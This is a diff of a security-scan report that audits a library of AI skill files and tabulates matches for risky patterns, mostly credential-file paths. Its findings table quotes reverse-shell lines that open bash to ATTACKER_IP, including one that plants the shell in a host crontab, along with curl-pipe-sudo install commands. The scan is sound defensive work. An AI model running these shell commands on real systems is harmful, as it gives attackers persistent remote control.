@@ -12,13 +12,13 @@ rewritten: backlog task 17 asks for a report only, and the library stays byte-id
 |---|---|
 | tree | `library/github-skills` |
 | scope | `instructions` (`SKILL.md` only) |
-| files scanned | 3,011 |
-| bytes scanned | 32,455,436 |
+| files scanned | 3,014 |
+| bytes scanned | 32,549,229 |
 | binary files skipped | 0 |
 | unreadable files | 0 |
 | patterns applied | 10 |
-| findings | 166 |
-| skills with at least one finding | 80 |
+| findings | 168 |
+| skills with at least one finding | 81 |
 
 ## Findings by pattern
 
@@ -30,7 +30,7 @@ rewritten: backlog task 17 asks for a report only, and the library stays byte-id
 | `base64-decode-exec` | high | decodes a hidden payload before executing it | 1 | 1 |
 | `reverse-shell` | high | opens an outbound shell | 4 | 2 |
 | `exfil-endpoint` | high | sends data to a request-collection endpoint | 14 | 8 |
-| `credential-path` | medium | reads or points at stored credentials | 117 | 51 |
+| `credential-path` | medium | reads or points at stored credentials | 119 | 52 |
 | `privilege-escalation` | medium | runs a mutating command as root | 19 | 17 |
 | `install-hook` | medium | package lifecycle hook, runs automatically on install | 0 | 0 |
 | `hidden-content` | low | text a human reader of the file would not see | 1 | 1 |
@@ -71,39 +71,41 @@ a `curl … | sudo bash` inside an Azure CLI install guide is documentation, not
 | high | `reverse-shell` | `offensive-container-escape` | `offensive-container-escape/SKILL.md` | 135 | `echo '* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /mnt/host/etc/crontab` |
 | high | `reverse-shell` | `offensive-container-escape` | `offensive-container-escape/SKILL.md` | 414 | `bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1` |
 | high | `reverse-shell` | `offensive-container-escape` | `offensive-container-escape/SKILL.md` | 470 | `echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /bin/bash_backup` |
-| medium | `credential-path` | `ai-image-generation-studio` | `ai-image-generation-studio/SKILL.md` | 180 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`, and` |
-| medium | `credential-path` | `ai-image-generation-studio` | `ai-image-generation-studio/SKILL.md` | 195 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
-| medium | `credential-path` | `ai-image-generation-studio` | `ai-image-generation-studio/SKILL.md` | 233 | `and stores one bearer token in `~/.beatra/credentials.json` (directory` |
-| medium | `credential-path` | `ai-logo-maker` | `ai-logo-maker/SKILL.md` | 180 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`, and` |
-| medium | `credential-path` | `ai-logo-maker` | `ai-logo-maker/SKILL.md` | 195 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
-| medium | `credential-path` | `ai-logo-maker` | `ai-logo-maker/SKILL.md` | 233 | `and stores one bearer token in `~/.beatra/credentials.json` (directory` |
-| medium | `credential-path` | `ai-multilingual-dubbing` | `ai-multilingual-dubbing/SKILL.md` | 180 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`, and` |
-| medium | `credential-path` | `ai-multilingual-dubbing` | `ai-multilingual-dubbing/SKILL.md` | 195 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
-| medium | `credential-path` | `ai-multilingual-dubbing` | `ai-multilingual-dubbing/SKILL.md` | 233 | `and stores one bearer token in `~/.beatra/credentials.json` (directory` |
-| medium | `credential-path` | `ai-photo-restyler` | `ai-photo-restyler/SKILL.md` | 180 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`, and` |
-| medium | `credential-path` | `ai-photo-restyler` | `ai-photo-restyler/SKILL.md` | 195 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
-| medium | `credential-path` | `ai-photo-restyler` | `ai-photo-restyler/SKILL.md` | 233 | `and stores one bearer token in `~/.beatra/credentials.json` (directory` |
-| medium | `credential-path` | `ai-podcast-voiceover` | `ai-podcast-voiceover/SKILL.md` | 180 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`, and` |
-| medium | `credential-path` | `ai-podcast-voiceover` | `ai-podcast-voiceover/SKILL.md` | 195 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
-| medium | `credential-path` | `ai-podcast-voiceover` | `ai-podcast-voiceover/SKILL.md` | 233 | `and stores one bearer token in `~/.beatra/credentials.json` (directory` |
+| medium | `credential-path` | `ai-image-generation-studio` | `ai-image-generation-studio/SKILL.md` | 164 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`,` |
+| medium | `credential-path` | `ai-image-generation-studio` | `ai-image-generation-studio/SKILL.md` | 183 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
+| medium | `credential-path` | `ai-image-generation-studio` | `ai-image-generation-studio/SKILL.md` | 237 | ``~/.beatra/credentials.json` (directory `0700`, file `0600`). The token never` |
+| medium | `credential-path` | `ai-logo-maker` | `ai-logo-maker/SKILL.md` | 166 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`,` |
+| medium | `credential-path` | `ai-logo-maker` | `ai-logo-maker/SKILL.md` | 185 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
+| medium | `credential-path` | `ai-logo-maker` | `ai-logo-maker/SKILL.md` | 239 | ``~/.beatra/credentials.json` (directory `0700`, file `0600`). The token never` |
+| medium | `credential-path` | `ai-multilingual-dubbing` | `ai-multilingual-dubbing/SKILL.md` | 166 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`,` |
+| medium | `credential-path` | `ai-multilingual-dubbing` | `ai-multilingual-dubbing/SKILL.md` | 185 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
+| medium | `credential-path` | `ai-multilingual-dubbing` | `ai-multilingual-dubbing/SKILL.md` | 239 | ``~/.beatra/credentials.json` (directory `0700`, file `0600`). The token never` |
+| medium | `credential-path` | `ai-photo-restyler` | `ai-photo-restyler/SKILL.md` | 166 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`,` |
+| medium | `credential-path` | `ai-photo-restyler` | `ai-photo-restyler/SKILL.md` | 185 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
+| medium | `credential-path` | `ai-photo-restyler` | `ai-photo-restyler/SKILL.md` | 239 | ``~/.beatra/credentials.json` (directory `0700`, file `0600`). The token never` |
+| medium | `credential-path` | `ai-podcast-voiceover` | `ai-podcast-voiceover/SKILL.md` | 166 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`,` |
+| medium | `credential-path` | `ai-podcast-voiceover` | `ai-podcast-voiceover/SKILL.md` | 185 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
+| medium | `credential-path` | `ai-podcast-voiceover` | `ai-podcast-voiceover/SKILL.md` | 239 | ``~/.beatra/credentials.json` (directory `0700`, file `0600`). The token never` |
 | medium | `credential-path` | `apple-appstore-reviewer` | `apple-appstore-reviewer/SKILL.md` | 55 | `- Background modes, Push, Tracking, App Groups, keychain access groups` |
 | medium | `credential-path` | `automate-this` | `automate-this/SKILL.md` | 223 | `7. **Account for auth and secrets.** If the process involves logging in or using credentials, never hardcode t` |
-| medium | `credential-path` | `beatra-ai-video-studio` | `beatra-ai-video-studio/SKILL.md` | 189 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`, and` |
-| medium | `credential-path` | `beatra-ai-video-studio` | `beatra-ai-video-studio/SKILL.md` | 205 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
-| medium | `credential-path` | `beatra-ai-video-studio` | `beatra-ai-video-studio/SKILL.md` | 246 | `and stores one bearer token in `~/.beatra/credentials.json` (directory` |
-| medium | `credential-path` | `beatra` | `beatra/SKILL.md` | 180 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`, and` |
-| medium | `credential-path` | `beatra` | `beatra/SKILL.md` | 195 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
-| medium | `credential-path` | `beatra` | `beatra/SKILL.md` | 234 | `and stores one bearer token in `~/.beatra/credentials.json` (directory` |
+| medium | `credential-path` | `beatra-ai-video-studio` | `beatra-ai-video-studio/SKILL.md` | 176 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`,` |
+| medium | `credential-path` | `beatra-ai-video-studio` | `beatra-ai-video-studio/SKILL.md` | 196 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
+| medium | `credential-path` | `beatra-ai-video-studio` | `beatra-ai-video-studio/SKILL.md` | 253 | ``~/.beatra/credentials.json` (directory `0700`, file `0600`). The token never` |
+| medium | `credential-path` | `beatra` | `beatra/SKILL.md` | 166 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`,` |
+| medium | `credential-path` | `beatra` | `beatra/SKILL.md` | 185 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
+| medium | `credential-path` | `beatra` | `beatra/SKILL.md` | 240 | ``~/.beatra/credentials.json` (directory `0700`, file `0600`). The token never` |
 | medium | `credential-path` | `claude-delegate` | `claude-delegate/SKILL.md` | 47 | `login Keychain; when the orchestrator's own sandbox blocks Keychain access (Codex's sandbox` |
 | medium | `credential-path` | `cloudflare-zero-trust` | `cloudflare-zero-trust/SKILL.md` | 333 | `# ~/.ssh/config` |
 | medium | `credential-path` | `codebase-audit-pre-push` | `codebase-audit-pre-push/SKILL.md` | 46 | `- `*.pem`, `*.key`, `*.cert`, `credentials.json`, `serviceAccountKey.json`` |
-| medium | `credential-path` | `ecommerce-listing-image-set` | `ecommerce-listing-image-set/SKILL.md` | 180 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`, and` |
-| medium | `credential-path` | `ecommerce-listing-image-set` | `ecommerce-listing-image-set/SKILL.md` | 195 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
-| medium | `credential-path` | `ecommerce-listing-image-set` | `ecommerce-listing-image-set/SKILL.md` | 233 | `and stores one bearer token in `~/.beatra/credentials.json` (directory` |
+| medium | `credential-path` | `ecommerce-listing-image-set` | `ecommerce-listing-image-set/SKILL.md` | 166 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`,` |
+| medium | `credential-path` | `ecommerce-listing-image-set` | `ecommerce-listing-image-set/SKILL.md` | 185 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
+| medium | `credential-path` | `ecommerce-listing-image-set` | `ecommerce-listing-image-set/SKILL.md` | 239 | ``~/.beatra/credentials.json` (directory `0700`, file `0600`). The token never` |
 | medium | `credential-path` | `ethical-hacking-methodology` | `ethical-hacking-methodology/SKILL.md` | 299 | `# Add attacker's public key to ~/.ssh/authorized_keys` |
 | medium | `credential-path` | `fedramp-compliance` | `fedramp-compliance/SKILL.md` | 377 | `# ~/.aws/config` |
 | medium | `credential-path` | `flutter-dart-code-review` | `flutter-dart-code-review/SKILL.md` | 268 | `- [ ] Sensitive data (tokens, credentials) stored using platform-secure storage (Keychain on iOS, EncryptedSha` |
 | medium | `credential-path` | `flutter-expert` | `flutter-expert/SKILL.md` | 139 | `- Secure storage implementation with native keychain integration` |
+| medium | `credential-path` | `gateguard` | `gateguard/SKILL.md` | 292 | `- its file name is `.env`, `.netrc`, or `.pgpass`, starts with `.env.`, ends` |
+| medium | `credential-path` | `gateguard` | `gateguard/SKILL.md` | 293 | `in `.pem`, `.key`, `.p12`, or `.pfx`, or starts with `id_rsa`, `id_ed25519`,` |
 | medium | `credential-path` | `git-commit` | `git-commit/SKILL.md` | 83 | `**Never commit secrets** (.env, credentials.json, private keys).` |
 | medium | `credential-path` | `ios-developer` | `ios-developer/SKILL.md` | 77 | `- Keychain Services for secure data storage` |
 | medium | `credential-path` | `ios-developer` | `ios-developer/SKILL.md` | 105 | `- Keychain Services for sensitive data storage` |
@@ -122,9 +124,9 @@ a `curl … | sudo bash` inside an Azure CLI install guide is documentation, not
 | medium | `credential-path` | `mobile-security-coder` | `mobile-security-coder/SKILL.md` | 43 | `- **Secret management**: Mobile credential storage, keychain/keystore integration, biometric-protected secrets` |
 | medium | `credential-path` | `mobile-security-coder` | `mobile-security-coder/SKILL.md` | 48 | `- **Keychain and Keystore**: Secure credential storage, biometric authentication integration, key derivation` |
 | medium | `credential-path` | `mobile-security-coder` | `mobile-security-coder/SKILL.md` | 80 | `- **iOS security**: Keychain Services, App Transport Security, iOS permission model, sandboxing` |
-| medium | `credential-path` | `music-generation-studio` | `music-generation-studio/SKILL.md` | 180 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`, and` |
-| medium | `credential-path` | `music-generation-studio` | `music-generation-studio/SKILL.md` | 195 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
-| medium | `credential-path` | `music-generation-studio` | `music-generation-studio/SKILL.md` | 233 | `and stores one bearer token in `~/.beatra/credentials.json` (directory` |
+| medium | `credential-path` | `music-generation-studio` | `music-generation-studio/SKILL.md` | 166 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`,` |
+| medium | `credential-path` | `music-generation-studio` | `music-generation-studio/SKILL.md` | 185 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
+| medium | `credential-path` | `music-generation-studio` | `music-generation-studio/SKILL.md` | 239 | ``~/.beatra/credentials.json` (directory `0700`, file `0600`). The token never` |
 | medium | `credential-path` | `offensive-fuzzing` | `offensive-fuzzing/SKILL.md` | 189 | `"sshkey": "/path/to/id_rsa",` |
 | medium | `credential-path` | `offensive-jwt` | `offensive-jwt/SKILL.md` | 116 | `- Keychain: Check `kSecAttrAccessible` — `kSecAttrAccessibleAlways` is insecure` |
 | medium | `credential-path` | `offensive-jwt` | `offensive-jwt/SKILL.md` | 117 | `- iTunes/iCloud backup extraction: unencrypted backups expose Keychain` |
@@ -153,41 +155,41 @@ a `curl … | sudo bash` inside an Azure CLI install guide is documentation, not
 | medium | `credential-path` | `overleaf-sync` | `overleaf-sync/SKILL.md` | 196 | `- **Never** write a token to a file (`.env`, `.netrc`, `tools/*.sh`, etc.) committed to any repo.` |
 | medium | `credential-path` | `overleaf-sync` | `overleaf-sync/SKILL.md` | 198 | `- On `401 Unauthorized` from push/pull, tell the user the keychain entry expired and to re-run `overleaf_setup` |
 | medium | `credential-path` | `pentest-commands` | `pentest-commands/SKILL.md` | 355 | `ssh2john id_rsa > ssh_hash.txt` |
-| medium | `credential-path` | `poster-design-studio` | `poster-design-studio/SKILL.md` | 180 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`, and` |
-| medium | `credential-path` | `poster-design-studio` | `poster-design-studio/SKILL.md` | 195 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
-| medium | `credential-path` | `poster-design-studio` | `poster-design-studio/SKILL.md` | 233 | `and stores one bearer token in `~/.beatra/credentials.json` (directory` |
+| medium | `credential-path` | `poster-design-studio` | `poster-design-studio/SKILL.md` | 166 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`,` |
+| medium | `credential-path` | `poster-design-studio` | `poster-design-studio/SKILL.md` | 185 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
+| medium | `credential-path` | `poster-design-studio` | `poster-design-studio/SKILL.md` | 239 | ``~/.beatra/credentials.json` (directory `0700`, file `0600`). The token never` |
 | medium | `credential-path` | `pr-review-expert` | `pr-review-expert/SKILL.md` | 272 | `> **Security note:** for repeated Jira use, prefer a `~/.netrc` entry` |
 | medium | `credential-path` | `pr-review-expert` | `pr-review-expert/SKILL.md` | 274 | `> `chmod 600 ~/.netrc`) and call `curl -s --netrc …` — no secret material in` |
-| medium | `credential-path` | `product-photo-studio` | `product-photo-studio/SKILL.md` | 180 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`, and` |
-| medium | `credential-path` | `product-photo-studio` | `product-photo-studio/SKILL.md` | 195 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
-| medium | `credential-path` | `product-photo-studio` | `product-photo-studio/SKILL.md` | 233 | `and stores one bearer token in `~/.beatra/credentials.json` (directory` |
+| medium | `credential-path` | `product-photo-studio` | `product-photo-studio/SKILL.md` | 166 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`,` |
+| medium | `credential-path` | `product-photo-studio` | `product-photo-studio/SKILL.md` | 185 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
+| medium | `credential-path` | `product-photo-studio` | `product-photo-studio/SKILL.md` | 239 | ``~/.beatra/credentials.json` (directory `0700`, file `0600`). The token never` |
 | medium | `credential-path` | `react-native-patterns` | `react-native-patterns/SKILL.md` | 184 | `await SecureStore.setItemAsync('auth_token', token) // Keychain / Keystore` |
-| medium | `credential-path` | `resubmit-pipeline` | `resubmit-pipeline/SKILL.md` | 335 | `Defer entirely to `/overleaf-sync setup` and `/overleaf-sync push`. Do **not** invent a parallel push mechanis` |
+| medium | `credential-path` | `resubmit-pipeline` | `resubmit-pipeline/SKILL.md` | 346 | `Defer entirely to `/overleaf-sync setup` and `/overleaf-sync push`. Do **not** invent a parallel push mechanis` |
 | medium | `credential-path` | `sendblue-cli` | `sendblue-cli/SKILL.md` | 25 | ``@sendblue/cli` is a Node CLI that creates a Sendblue account, provisions an iMessage-enabled number, and send` |
 | medium | `credential-path` | `sendblue-cli` | `sendblue-cli/SKILL.md` | 115 | `- ✅ **Re-run `setup` as the same OS user** that owns `~/.sendblue/credentials.json`.` |
 | medium | `credential-path` | `sendblue-cli` | `sendblue-cli/SKILL.md` | 127 | `- Credentials are written to `~/.sendblue/credentials.json` with mode `600`. Treat that file like an API key —` |
 | medium | `credential-path` | `sendblue-cli` | `sendblue-cli/SKILL.md` | 138 | `- **Credentials are per-user.** `~/.sendblue/credentials.json` is owner-only (`600`). Don't `sudo` and pollute` |
 | medium | `credential-path` | `sshepherd` | `sshepherd/SKILL.md` | 41 | `Every connection detail is declared ahead of time and never appears on the command line: ssh aliases in `~/.ss` |
 | medium | `credential-path` | `sshepherd` | `sshepherd/SKILL.md` | 87 | `- ✅ Declare every alias/target/recipe ahead of time in `~/.ssh/config` / `targets.toml` / recipe TOML — never ` |
-| medium | `credential-path` | `suno-lyrics-to-song` | `suno-lyrics-to-song/SKILL.md` | 180 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`, and` |
-| medium | `credential-path` | `suno-lyrics-to-song` | `suno-lyrics-to-song/SKILL.md` | 195 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
-| medium | `credential-path` | `suno-lyrics-to-song` | `suno-lyrics-to-song/SKILL.md` | 233 | `and stores one bearer token in `~/.beatra/credentials.json` (directory` |
+| medium | `credential-path` | `suno-lyrics-to-song` | `suno-lyrics-to-song/SKILL.md` | 166 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`,` |
+| medium | `credential-path` | `suno-lyrics-to-song` | `suno-lyrics-to-song/SKILL.md` | 185 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
+| medium | `credential-path` | `suno-lyrics-to-song` | `suno-lyrics-to-song/SKILL.md` | 239 | ``~/.beatra/credentials.json` (directory `0700`, file `0600`). The token never` |
 | medium | `credential-path` | `systematic-debugging` | `systematic-debugging/SKILL.md` | 98 | `echo "=== Keychain state: ==="` |
 | medium | `credential-path` | `systematic-debugging` | `systematic-debugging/SKILL.md` | 99 | `security list-keychains` |
-| medium | `credential-path` | `talking-avatar-video` | `talking-avatar-video/SKILL.md` | 180 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`, and` |
-| medium | `credential-path` | `talking-avatar-video` | `talking-avatar-video/SKILL.md` | 195 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
-| medium | `credential-path` | `talking-avatar-video` | `talking-avatar-video/SKILL.md` | 234 | `and stores one bearer token in `~/.beatra/credentials.json` (directory` |
+| medium | `credential-path` | `talking-avatar-video` | `talking-avatar-video/SKILL.md` | 166 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`,` |
+| medium | `credential-path` | `talking-avatar-video` | `talking-avatar-video/SKILL.md` | 185 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
+| medium | `credential-path` | `talking-avatar-video` | `talking-avatar-video/SKILL.md` | 240 | ``~/.beatra/credentials.json` (directory `0700`, file `0600`). The token never` |
 | medium | `credential-path` | `textme` | `textme/SKILL.md` | 218 | `- **`apiKey` / `apiSecret` confusion.** Sendblue's API credentials (from `sendblue show-keys`) are distinct fr` |
 | medium | `credential-path` | `unslop-file` | `unslop-file/SKILL.md` | 150 | `- Sensitive paths (anything matching `.env*`, `*.pem`, `*.key`, `~/.ssh/`, `~/.aws/`, etc.) are refused before` |
-| medium | `credential-path` | `viral-video-teardown-remake` | `viral-video-teardown-remake/SKILL.md` | 180 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`, and` |
-| medium | `credential-path` | `viral-video-teardown-remake` | `viral-video-teardown-remake/SKILL.md` | 195 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
-| medium | `credential-path` | `viral-video-teardown-remake` | `viral-video-teardown-remake/SKILL.md` | 234 | `and stores one bearer token in `~/.beatra/credentials.json` (directory` |
-| medium | `credential-path` | `voice-cloning-studio` | `voice-cloning-studio/SKILL.md` | 180 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`, and` |
-| medium | `credential-path` | `voice-cloning-studio` | `voice-cloning-studio/SKILL.md` | 195 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
-| medium | `credential-path` | `voice-cloning-studio` | `voice-cloning-studio/SKILL.md` | 234 | `and stores one bearer token in `~/.beatra/credentials.json` (directory` |
-| medium | `credential-path` | `voiceover-narration-studio` | `voiceover-narration-studio/SKILL.md` | 180 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`, and` |
-| medium | `credential-path` | `voiceover-narration-studio` | `voiceover-narration-studio/SKILL.md` | 195 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
-| medium | `credential-path` | `voiceover-narration-studio` | `voiceover-narration-studio/SKILL.md` | 233 | `and stores one bearer token in `~/.beatra/credentials.json` (directory` |
+| medium | `credential-path` | `viral-video-teardown-remake` | `viral-video-teardown-remake/SKILL.md` | 166 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`,` |
+| medium | `credential-path` | `viral-video-teardown-remake` | `viral-video-teardown-remake/SKILL.md` | 185 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
+| medium | `credential-path` | `viral-video-teardown-remake` | `viral-video-teardown-remake/SKILL.md` | 240 | ``~/.beatra/credentials.json` (directory `0700`, file `0600`). The token never` |
+| medium | `credential-path` | `voice-cloning-studio` | `voice-cloning-studio/SKILL.md` | 166 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`,` |
+| medium | `credential-path` | `voice-cloning-studio` | `voice-cloning-studio/SKILL.md` | 185 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
+| medium | `credential-path` | `voice-cloning-studio` | `voice-cloning-studio/SKILL.md` | 240 | ``~/.beatra/credentials.json` (directory `0700`, file `0600`). The token never` |
+| medium | `credential-path` | `voiceover-narration-studio` | `voiceover-narration-studio/SKILL.md` | 166 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`,` |
+| medium | `credential-path` | `voiceover-narration-studio` | `voiceover-narration-studio/SKILL.md` | 185 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
+| medium | `credential-path` | `voiceover-narration-studio` | `voiceover-narration-studio/SKILL.md` | 239 | ``~/.beatra/credentials.json` (directory `0700`, file `0600`). The token never` |
 | medium | `privilege-escalation` | `arm-templates` | `arm-templates/SKILL.md` | 28 | `curl -sL https://aka.ms/InstallAzureCLIDeb \| sudo bash` |
 | medium | `privilege-escalation` | `azure-aks` | `azure-aks/SKILL.md` | 36 | `curl -sL https://aka.ms/InstallAzureCLIDeb \| sudo bash` |
 | medium | `privilege-escalation` | `azure-container-registry-cli` | `azure-container-registry-cli/SKILL.md` | 17 | `curl -sL https://aka.ms/InstallAzureCLIDeb \| sudo bash # Linux` |
@@ -211,7 +213,7 @@ a `curl … | sudo bash` inside an Azure CLI install guide is documentation, not
 
 ## Distinct lines behind the findings
 
-166 findings collapse to 107 distinct (pattern, line) pairs.
+168 findings collapse to 109 distinct (pattern, line) pairs.
 8 of those pairs repeat across skills; the table lists the most repeated ones,
 so reading it reviews most of the queue. Fix or accept a line once, and every skill carrying
 it is decided.
@@ -219,8 +221,8 @@ it is decided.
 | pattern | skills | line |
 |---|---|---|
 | `credential-path` | 16 | `- ❌ Do not print, paste, or move the token out of `~/.beatra/credentials.json`.` |
-| `credential-path` | 16 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`, and` |
-| `credential-path` | 16 | `and stores one bearer token in `~/.beatra/credentials.json` (directory` |
+| `credential-path` | 16 | ``credentials.json`, `installation.json`, `host.json`, `skills.json`,` |
+| `credential-path` | 16 | ``~/.beatra/credentials.json` (directory `0700`, file `0600`). The token never` |
 | `curl-pipe-shell` | 6 | `curl -sL https://aka.ms/InstallAzureCLIDeb \| sudo bash` |
 | `privilege-escalation` | 6 | `curl -sL https://aka.ms/InstallAzureCLIDeb \| sudo bash` |
 | `credential-path` | 3 | `ios keychain dump` |
